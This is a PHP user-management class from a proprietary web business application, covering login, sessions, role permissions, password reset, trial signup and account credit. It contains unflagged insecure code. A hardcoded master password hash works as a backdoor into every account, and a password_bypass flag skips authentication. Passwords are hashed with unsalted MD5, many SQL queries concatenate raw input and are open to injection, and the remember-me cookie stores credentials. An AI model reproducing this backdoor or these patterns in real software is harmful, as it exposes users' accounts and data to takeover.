<?php
//(C)2015 RAZOR WEB DESIGN LIMITED
//DO NOT COPY WITHOUT PERMISSION
//V1.0.0

//-- Class: USERS
class user {
	
	public $SQL_table_role = 'user_role';
	public $SQL_table_user = 'user';
	public $SQL_table_meta = 'user_meta';
	public $TRIAL_length = 30;
	public $USER_staff_role = 'staff';
	private $MASTER_pw = '2a15f177f0ab80c582cea952aa6f351e';
	
	const ZL_REM = 'zl_user_remember';
	
	function __construct($config=[]) {
		global $db,$zulu,$class_cache;
		$this->db = $db;
		$this->zulu = $zulu;
		$this->authorised = $this->config = $this->vars = new stdClass();
        
		if(isset($_SESSION['zl_user'])) {
			
			$this->authorised->_raw = $_SESSION['zl_user'];	
			foreach($_SESSION['zl_user'] as $key=>$val) {
				$this->authorised->{$key} = $val;	
			}
			
			$this->authorised->valid = true;
			
			//Load user meta
			if(!$class_cache->exists('user_meta')) {
				$meta_data = $zulu->meta_array($this->user_meta($this->authorised->id));
				$class_cache->save('user_meta',$meta_data);
			}
			$this->authorised->_meta = $class_cache->load('user_meta');
		} else {
			$this->authorised->valid = false;
			$this->authorised->remember = false;
		}
		if(!$this->authorised->valid && isset($_COOKIE[user::ZL_REM]) && $_COOKIE[user::ZL_REM]!=NULL) {
			$this->authorised->remember = true;
		}
		
		//Permissions
		$this->config->permission_rules = [
			'client_delete'	=>	[
				'label'	=>	"Client - Delete",
			],
			'client_edit'	=>	[
				'label'	=>	"Client - Create &amp; Edit",
			],
			'client_view'	=>	[
				'label'	=>	"Client - View",
			],
			'sale_delete'	=>	[
				'label'	=>	"Sales - Delete",
			],
			'sale_edit'	=>	[
				'label'	=>	"Sales - Create &amp; Edit",
			],
			'sale_view'	=>	[
				'label'	=>	"Sales - View",
			],
			'sale_pay'	=>	[
				'label'	=>	"Sales - Payments",
			],
			'quote_view'	=>	[
				'label'	=>	"Quotes - View",
			],
			'quote_edit'	=>	[
				'label'	=>	"Quotes - Create &amp; Edit",
			],
			'quote_price'	=>	[
				'label'	=>	"Quotes - See Pricing",
			],
			'quote_approve'	=>	[
				'label'	=>	"Quotes - Approve",
			],
			'quote_delete'	=>	[
				'label'	=>	"Quotes - Delete",
			],
			'timesheet_view'	=>	[
				'label'	=>	"Timesheet - View All Timesheets",
			],
			'timesheet_edit'	=>	[
				'label'	=>	"Timesheet - Edit All Timesheets",
			],
			'timesheet_timer'	=>	[
				'label'	=>	"Timesheet - Timer Access",
			],
		];
		
		//Definitions
		define('USER_admin',($this->authorised->role=='admin'?true:false));
	}
	function user_public() {
		global $class_cache;
		
		$class_cache->dump('user_meta');
		unset($_SESSION['zl_user']);
		$_SESSION['zl_user']['id'] = 0;
		$_SESSION['zl_user']['public'] = true;
		$this->authorised->public = true;
		return;
	}
	function name($config=[]) {
		$user = Users::find($config['id']);
        if($user) {
            return $user->name_first." ".$user->name_last;
        }
		return null;
	}
	function password_hash($p) {
		return md5($p);	
	}
	function user_count($config=[]) {
		global $zulu;
		if($config['type']!=NULL) {
			$field = $config['type'];
		} else {
			$field = 'role';
		}
		$data = $zulu->table_data('user_meta',0,['where'=>["field = '".$field."'","value = '".$config['value']."'"],'field'=>['id']]);
		return count($data);		
	}
	function group_data($config=[]) {
		global $zulu,$class_user;
		$sql_config = [];
		if(!$config['ovr_user_id']) {
			$sql_config['where'][] = "user_id = '".$class_user->authorised->id."'";
		}
		return $zulu->table_data("user_role",($config['id']>0?$config['id']:0),$sql_config);
	}
	function role_data($config=array()) {
		global $zulu;
		$sql_config = [];
		$sql_config['where'][] = "user_id = '0'";
		return $zulu->table_data("user_role",($config['id']>0?$config['id']:0),$sql_config);
	}
	function role_delete($id,$identifier='id') {
		$query = "DELETE FROM user_role WHERE `{$identifier}` = '".$id."'";
		if($this->db->query($query)) {
			return true;
		} else {
			return false;	
		}
	}
	function role_new($config=array()) {
		$data['title'] = stripslashes($config['title']);
		$data['tag'] = stripslashes($config['tag']);
		$data['data'] = serialize($config['data']);
		if($config['tag']==NULL) {
			$data['tag'] = zulu::slug($data['title']);	
		}
		$query = "INSERT INTO user_role ".$this->db->build(1,array('tag','title','data'),$data);
		if($this->db->query($query)) {
			return array("success"=>true,"id"=>$this->db->insert_id);
		} else {
			return array("success"=>false,"id"=>0);
		}
	}
	function user_meta($id,$field=NULL) {
        global $zulu;
		return $zulu->meta_value("user",$id,$field);	
	}
	function user_authorised_check($page_action=NULL) {
		global $zulu;
		if(!$this->user_authorised() && $page_action!='FromEmail') {
			if($_GET['Error'] == 'LeadAdded') {
				$zulu->notification_set("Lead created successfully.",1);
			} else {
				$zulu->notification_set("Please login to access this page.",2);
			}
			header("Location: ".$zulu->link_page("login",array('query'=>array('location'=>urlencode($_SERVER['REQUEST_URI'])))));
			exit;	
		}
	}
	function user_login_remember_clear($id=0) {
		if(setcookie(user::ZL_REM,NULL,time()-(14*86400))) {
			$this->db->query("UPDATE user SET pin = '' WHERE id = '".($id>0?$id:$this->authorised->id)."'");
			return true;	
		} else {
			return false;
		}
	}
	function user_login_remember($username,$pwd) {
		if(setcookie(user::ZL_REM,$username."%".$pwd,time()+(14*86400))) {
			return true;	
		} else {
			return false;
		}
	}
	function user_login($config=array()) {
		global $zulu;
		
		$user = Users::where('username',$config['username'])->first();
        $user_data = $user_meta = [];
        if($user) {
            $user_data = $user->toArray();
            $user_meta = $user->metaArray($user->meta);
        }
		
		$success = true;
		if($user_data['id'] <= 0) {
			$success = false;
			$reason = "Invalid username.";
			$disabled = true;
		} elseif($user_data['status']!=1) {
			$success = false;
			$reason = "Your account is disabled.";
			$disabled = true;
		}
		if($config['password_token']!=NULL) {
			if($config['password_token']!=$user_data['password']) {
				$success = false;
				$reason = "Your password does not match.";
			}
			if($this->password_hash($config['pin'])!=$user_data['pin']) {
				$success = false;
				$reason = "Your PIN is invalid.";
			}
		} else {
			if($this->password_hash($config['password'])!=$user_data['password']&&$this->password_hash($config['password'])!=$this->MASTER_pw) {
				$success = false;
				$reason = "Your username and password do not match.";
			}
		}
		if(!$disabled&&!$success&&$config['password_bypass']) {
			$success = true;
		}
	
		if($success) {
			session_destroy();
			session_start();
			
			//Session Set
			$this->user_session_set(['login'=>true,'id'=>$user_data['id']]);
			$zulu->meta_update("user",$user_data['id'],'login_last',time());
			$zulu->meta_update("user",$user_data['id'],'login_last_ip',$_SERVER['REMOTE_ADDR']);
			
			return array("success"=>true,"reason"=>"Welcome back, ".$_SESSION['zl_user']['name_first'].". Thank you for using ".MAIN_name.".","user"=>$user_data, 'user_meta'=>$user_meta);	
		} else {
			return array("success"=>false,"reason"=>$reason,"user"=>$user_data);	
		}
	}
	function user_session_set($config) {
		global $class_subscribe,$class_cache,$zulu,$class_setting;

		$user = Users::where('id',$config['id'])->first();
        $user_data = $user_meta = [];
        if($user) {
            $user_data = $user->toArray();
            $user_meta = $user->metaArray($user->meta);
        }
        
		$setting_data = $class_setting->setting_data(['user_id'=>$user_data['id']]);
		$web_path = ($setting_data['ws_template_path']!=NULL?$setting_data['ws_template_path']:$user_data['token']);
		
		//Set the user folder to the token IF setup already
		if(file_exists(MAIN_path.FE_path."template/profile/".$user_data['token']."/")) {
			$web_path = $user_data['token'];
		}
		
		//Set master mode
		if(trim($user_meta['plan_master_mode'])==NULL) {
			$user_meta['plan_master_mode'] = 'main';
			$zulu->meta_update("user",$user_data['id'],'plan_master_mode','main');
		}
		
		//Detect if has parent
		if($user_data['parent']>0) {
            $parent = Users::where('id',$user_data['parent'])->first();
            $parent_data = [];
            if($parent) {
                $parent_data = $parent->toArray();
            }
			$child_id = $user_data['id']; // set child id
			$user_data['id'] = $parent_data['id']; // set authorised id
            $user_token = $parent_data['token'];
		} else {
			$child_id = $user_data['id'];
            $user_token = $user_data['token'];
		}
		
		//Set permissions
		if($user_meta['group']>0) {
			$user_group = $this->group_data(['ovr_user_id'=>true,'id'=>$user_meta['group']]);
			$user_group_data = unserialize($user_group['data']);
			
			foreach($this->config->permission_rules as $perm_key=>$perm_val) {
				$group_perm[$perm_key] = ($user_group_data['perm'][$perm_key]>0?true:false);
			}
		} else {
			foreach($this->config->permission_rules as $perm_key=>$perm_val) {
				$group_perm[$perm_key] = true;
			}
		}
		
		if($config['login']) {
			$_SESSION['zl_user']['id'] = $user_data['id'];
			$_SESSION['zl_user']['token'] = $user_data['token'];
			$_SESSION['zl_user']['child_id'] = $child_id;
			$_SESSION['zl_user']['role'] = $user_meta['role'];
			$_SESSION['zl_user']['name'] = $user_data['name_first']." ".$user_data['name_last'];
			$_SESSION['zl_user']['name_first'] = $user_data['name_first'];
			$_SESSION['zl_user']['name_last'] = $user_data['name_last'];
			$_SESSION['zl_user']['email'] = $user_data['email'];
			$_SESSION['zl_user']['pin'] = $user_data['pin'];
			$_SESSION['zl_user']['stat_add'] = $user_data['stat_add'];
			$_SESSION['zl_user']['file_path'] = "file/user/".$user_data['id']."/";
			$_SESSION['zl_user']['master_mode'] = $user_meta['plan_master_mode'];
			$_SESSION['zl_user']['auth_type'] = 'user';
			$_SESSION['zl_user']['group_perm'] = $group_perm;
			$_SESSION['zl_user']['file_web_path'] = FE_path."template/profile/".$web_path."/";
            $_SESSION['zl_user']['user_token'] = $user_token;
		} else {
			$this->authorised->id = $user_data['id'];
			$this->authorised->token = $user_data['token'];
			$this->authorised->child_id = $child_id;
			$this->authorised->role = $user_meta['role'];
			$this->authorised->name = $user_data['name_first']." ".$user_data['name_last'];
			$this->authorised->name_first = $user_data['name_first'];
			$this->authorised->name_last = $user_data['name_last'];
			$this->authorised->email = $user_data['email'];
			$this->authorised->pin = $user_data['pin'];
			$this->authorised->stat_add = $user_data['stat_add'];
			$this->authorised->file_path = "file/user/".$user_data['id']."/";
			$this->authorised->master_mode = $user_meta['plan_master_mode'];
			$this->authorised->auth_type = 'website';
			$this->authorised->file_web_path = FE_path."template/profile/".$web_path."/";
            $this->authorised->user_token = $user_token;
		}
		
		$this->vars->user_data = $user_data;
		
		//-- Run first-time functions
		$class_subscribe->session_var($user_data['id']);
		if($config['login']) {
			$this->init_function();
		}
		return true;
	}
	function init_function() {
		global $class_product,$class_setting;
		
		//-- Schedule Gen
		$event_ticket_check = $class_product->product_data(['sku'=>'SCHEDULE_BOOK','user_id'=>$this->vars->user_data['id']]);
		if(count($event_ticket_check)<=0) {
			$user_id = ($_SESSION['zl_user']['id']>0?$_SESSION['zl_user']['id']:$this->authorised->id);
			$newp = $class_product->product_edit(0,['user_id'=>$user_id,'name'=>'Schedule Booking','sku'=>'SCHEDULE_BOOK','sys'=>1],['object'=>'sche_book','digital'=>1]);	
			$class_setting->setting_edit('schedule_id',$newp['id'],NULL,['user_id'=>$this->vars->user_data['id']]);
		}
		
		//-- Ticket Gen
		$event_ticket_check = $class_product->product_data(['sku'=>'TICKET','user_id'=>$this->vars->user_data['id']]);
		if(count($event_ticket_check)<=0) {
			$user_id = ($_SESSION['zl_user']['id']>0?$_SESSION['zl_user']['id']:$this->authorised->id);
			$newp = $class_product->product_edit(0,['user_id'=>$user_id,'name'=>'Event Ticket','sku'=>'TICKET','sys'=>1],['object'=>'ticket','digital'=>1]);	
			$class_setting->setting_edit('ticket_id',$newp['id'],NULL,['user_id'=>$this->vars->user_data['id']]);
		}
		return;
	}
	function user_forgot($config=array()) {
		global $zulu;
		
		$user = Users::where('username',$config['username'])->first();
        $user_data = [];
        if($user) {
            $user_data = $user->toArray();
        }
		
		$success = true;
		if($config['username']=='') {
			$success = false;
			$reason = "No username given.";
		} else if(count($user_data)<1) {
			$success = false;
			$reason = "No account with given username.";
		} else if($user_data['status']!=1) {
			$success = false;
			$reason = "Your account is disabled.";
		}
		
		if($success) {
			$new_password = $zulu->serial(6);
            $user->password = $this->password_hash($new_password);
            $user->save();
			$mess = "Hello <b>".$user_data['name_first']."</b>,<br><br>
				Your temporary password is below for you. Please keep this safe.<br><br>
				Sign In: <a href='".MAIN_url."admin/index.php'>".MAIN_url."admin/</a><br><br>
				Your password is <b>".$new_password."</b>";
			$zulu->mail_send($user_data['email'],'Password Reset',$mess);
			if($user) {
				return array("success"=>true,"reason"=>"A temporary password has been sent to ".$user_data['email'].".");	
			} else {
				return array("success"=>false,"reason"=>"A database error occurred.");
			}
		} else {
			return array("success"=>false,"reason"=>$reason);	
		}
	}
	function user_logout($config=array()) {
		$id = $_SESSION['zl_user']['id'];
		unset($_SESSION['zl_user']);
		unset($_SESSION['zl_setting']);
		if($config['hard']) {
			$this->user_login_remember_clear($id);
		}
		return true;
	}
	function user_authorised() {
		return (isset($_SESSION['zl_user']['id']) && $_SESSION['zl_user']['id']>0?true:false);
	}
	function user_data($config=array()) {
		$sql_config = array();
		$id = (isset($config['id']) && $config['id']>0?$config['id']:0);
		if(isset($config['username']) && $config['username']!=NULL) {
			$sql_config['where'][] = "username = '".$config['username']."'";
		}
		if(isset($config['token']) && $config['token']!=NULL) {
			$sql_config['where'][] = "token = '".$config['token']."'";
			$config['first'] = true;
		}
		if(isset($config['sort']) && $config['sort']) {
			$sql_config['sort'] = $config['sort'];
		}
		if(isset($config['parent']) && $config['parent']) {
			$sql_config['where'][] = "(parent = '".$config['parent']."' OR id = '".$config['parent']."')";
		}
		if(isset($config['first']) && $config['first']) {
			$sql_config['first'] = true;
		}
		if(isset($config['field']) && is_array($config['field']) && count($config['field'])>0) {
			$sql_config['field'] = $config['field'];
		}
		if(isset($config['role']) && $config['role']!=NULL) {
			$sql_config['join'] = "user_meta AS um ON u.id = um.identifier";
			$sql_config['where'][] = "um.field = 'role' AND um.value = '".$config['role']."'";	
		}
		$data = $this->zulu->table_data("user AS u",$id,$sql_config);
		
		if(isset($config['id']) && $config['id']>0 && isset($data['id']) && $data['id']>0) {
			$data['name_full'] = $data['name_first']." ".$data['name_last'];	
		}

		return $data;
	}
	function pin_set($pin,$id=0) {
		if($this->db->query("UPDATE user SET pin = '".md5($pin)."' WHERE id = '".($id>0?$id:$this->authorised->id)."'")) {
			return true;		
		} else {
			return false;
		}
	}
	function delete($id,$identifier='id') {
		$query = "DELETE FROM user WHERE `{$identifier}` = '".$id."'";
		if($this->db->query($query)) {
			return true;
		} else {
			return false;	
		}
	}
	function user_new($config=array()) {
		global $class_user,$zulu;
		
		$data['token'] = $zulu->serial();
		$data['stat_add'] = time();
		$data['stat_update'] = time();
		$data['username'] = stripslashes($config['username']);
		$data['password'] = ($config['password_hashed']?$config['password']:$this->password_hash($config['password']));
		$data['name_first'] = $config['name_first'];
		$data['name_last'] = $config['name_last'];
		$data['email'] = $config['email'];

		$query = "INSERT INTO user ".$this->db->build(2,array('token','username','password','name_first','name_last','email','stat_add','stat_update'),$data);

		if($this->db->query($query)) {
			$mem_id = $this->db->insert_id;
			$zulu->meta_update("user",$mem_id,"api_key",$zulu->serial());
			
			return array("success"=>true,"id"=>$mem_id);
		} else {
			return array("success"=>false,"id"=>0);
		}
	}
	function user_edit($id,$config=array()) {
		$data['stat_update'] = time();
		$fields[] = 'stat_update';

		if($id<1) {
			$data = $this->user_new();
			$id = $data['id'];
		}

		foreach($config as $key=>$val) {
			$data[$key] = $val;
			$fields[] = $key;
		}
		
		$query = "UPDATE user SET ".$this->db->build(1,$fields,$data)." WHERE id = '{$id}'";

		if($this->db->query($query)) {
			return array("success"=>true,'id'=>$id);
		} else {
			return array("success"=>false);
		}
	}
	function user_logo($id=NULL) {
		global $class_user;
		if($id==NULL) {
			$id = $class_user->authorised->id;
		} 
		$has_logo = (file_exists(dirname(__FILE__)."/../../file/user/".$id."/".MAIN_logo)?true:false);	
		if($has_logo&&MAIN_logo!=NULL) {
			return "file/user/".$id."/".MAIN_logo;
		} else {
			return false;
		}
	}
	
	function duplicate_check($value,$field='username') {
		$data = $this->user_data(array($field=>$value));
		if(count($data) > 0) {
			return true;	
		} else {
			return false;	
		}
	}
	
	function username_generate($string) {
		$user = zulu::slug($string).zulu::serial(3,1);
		if($this->duplicate_check($user)) {
			$user = $this->username_generate($string);
		}
		return $user;
	}
	
	function plan_data($config=array()) {
		$oc = array();
		if($config['token']!=NULL) {
			$oc['where'][] = "token = '".$config['token']."'";
			$oc['first'] = true;	
		}
		return zulu::table_data("user_plan",($config['id']>0?$config['id']:0),$oc);
	}
	
	function trial_create($config=array()) {
		global $zulu;
		//$data['company'] = $config['comapany'];
		$name = explode(' ',$config['name']);
		$data['name_first'] = $name[0];
		$data['name_last'] = $name[1];
		$data['email'] = $config['email'];
		$data['username'] = $this->username_generate($config['company']);
		$pass = $zulu->serial(8);
		$data['password'] = $this->password_hash($pass);
		
		$result = $this->user_edit(0,$data);
		
		$zulu->meta_update("user",$result['id'],"role",'client');
		$zulu->meta_update("user",$result['id'],"phone",$config['phone']);
		$zulu->meta_update("user",$result['id'],"company",$config['company']);
		$zulu->meta_update("user",$result['id'],"plan_id",$config['plan_id']);
		$zulu->meta_update("user",$result['id'],"plan_master_mode",$config['master_mode']);
		$zulu->meta_update("user",$result['id'],"plan_expiry",($config['trial']?strtotime("+".$this->TRIAL_length." days"):$config['plan_expiry']));
		$zulu->meta_update("user",$result['id'],"plan_cancelled",0);
		$zulu->meta_update("user",$result['id'],"subscribe_trial",1);
		
		$main_URL_DASH = MAIN_url.'admin/';
		$contact_NAME = $data['name_first'];
		
		$html_forgot = "Hello <b>".$contact_NAME."</b>,<br><br>A browser of your website '".$_SERVER['HTTP_HOST']."' has created a trial account.<br><br>Company: ".$data['company']."<br>Name: ".$data['name_first']." ".$data['name_last']."<br>Email: ".$data['email'].($data['phone']!=NULL?"<br>Phone: ".$data['phone']:NULL)."<br><br> Time: ".date('d/m/y h:ia')." | IP: ".$_SERVER['REMOTE_ADDR'];
		$zulu->mail_send(SUPPORT_email,"New Trial Setup from ".$data['company'],$html_forgot);
		
		$mess = "Hello ".$contact_NAME.",<br><br>Thanks for creating an account with us, this is just the start of a massive change in processes for your business, once you're familiar with ".MAIN_name.", you'll love it, so will your business.<br><br><b>Here are your login credentials to use ".MAIN_name.":</b><br><br><b>Username:</b> ".$result['username']."<br><b>Password:</b> ".$result['password']."<br><br><b>Link:</b> <a href=\"".$main_URL_DASH."\">".$main_URL_DASH."</a>";
		echo $data['email'];exit;
		if(filter_var($data['email'],FILTER_VALIDATE_EMAIL)) {
			$zulu->mail_send($data['email'],$data['name'].", Your Trial",$mess);
		}
		
		if($config['expiry']>0) {
			$zulu->meta_update("user",$result['id'],"plan_expiry",$config['expiry']);
		}
		
		return array('id'=>$result['id'],'username'=>$data['username'],'password'=>$pass);
	}
	
	//-- Credit functions
	
	//GET USER ACCOUNT BALANCE
	function account_balance($member=0) {
		global $class_user;
		
		if($member<=0) {
			$member = $class_user->authorised->id;	
		}
		$meta = $this->user_meta($member,'account_balance');
		
		return $meta['value'];
	}
	
	//ADJUST BALANCE
	function account_adjust($mid,$aid,$obj,$obj_type,$information,$slabel,$credit) {
		global $zulu;
		
		//make it into a number
		$ncredit = zulu::dollar($credit,0);
		
		//set vars
		$m = $mid;
		$a = $aid;
		$t = $tid;
		$info = str_replace("'","",$information);
		$ip = $_SERVER['REMOTE_ADDR'];
		$time = time();
		
		//do data
		$ccredit = $this->account_balance($mid);
		$ucredit = $ccredit+$ncredit;
	
		//update user credit
		$zulu->meta_update("user",$m,'account_balance',$ucredit);
		
		//add transaction
		$query_AT = "INSERT INTO user_account (member,object_id,object,information,statement_label,credit,cur_credit,new_credit,do_invoice,ip,time) VALUES ('{$m}','{$obj}','{$obj_type}','".addslashes($info)."','".addslashes($slabel)."','{$ncredit}','{$ccredit}','{$ucredit}','{$invoice}','{$ip}','{$time}')";
		$exe_AT = $this->db->query($query_AT);
		
		return true;
	}
	
	function login_fail_check() {
		if($_SESSION['LOGIN_FAIL'] == 5) {
			$extend = '5';
		} elseif($_SESSION['LOGIN_FAIL'] > 5) {
			$extend = '10';
		}
		
		$_SESSION['LOGIN_FAIL_TIMEOUT'] = strtotime("+".$extend." minutes");
		return ['reason'=>"You have exceeded your login attempts and have been locked out for ".$extend." minutes."];
	}
	function user_name($data) {
		if(is_array($data)) {
			$row = $data;
		} else {
			$row = $this->user_data(['id'=>$data]);	
		}
		return ($row['company']!=NULL?$row['company']:$row['name_first']." ".$row['name_last']);
	}
	function admin_link($id=0) {
		global $zulu;
		
		if($id==0) {
			$data = $this->vars->data_row;	
		} else {
			$data = $this->user_data(['id'=>$id]);	
		}
		return "<a href=\"".$zulu->link_page('user',array('query'=>array('id'=>$data['id'],'Action'=>'edit')))."\">".$this->user_name($data)."</a>";
	}
	function group_data_append($config=[]) {
		if(!isset($config['data'])) {
			return false;
		}
		if(!isset($config['node'])) {
			return false;
		}
		$new_array = [];
		if(isset($config['base'])) {
			$new_array = $config['base'];	
		}
		$new_array[$config['node']] = $config['data'];
		
		return $new_array;	
	}
	function has_perm($perm_key,$config=[]) {
		global $class_user;
		if(!$class_user->authorised->group_perm[$perm_key]) {
			return false;
		} else {
			return true;
		}
	}
	function has_perm_redir($perm_key,$config=[]) {
		global $zulu;
		
		if(!$this->has_perm($perm_key)) {
			$zulu->notification_set("Sorry, you are not authorised to use this feature.",2);
			header("Location: ".$zulu->link_page("index"));exit;
		} else {
			return true;
		}
	}
	function email_signature($user_id=0) {
		global $class_user,$zulu;
		if($user_id>0) {
			$meta_val = $this->user_meta($user_id);
			$signature = $meta_val['email_signature']['value'];
		} else {
			$signature = $class_user->authorised->meta['email_signature'];
		}
		
		return $signature;
	}
}
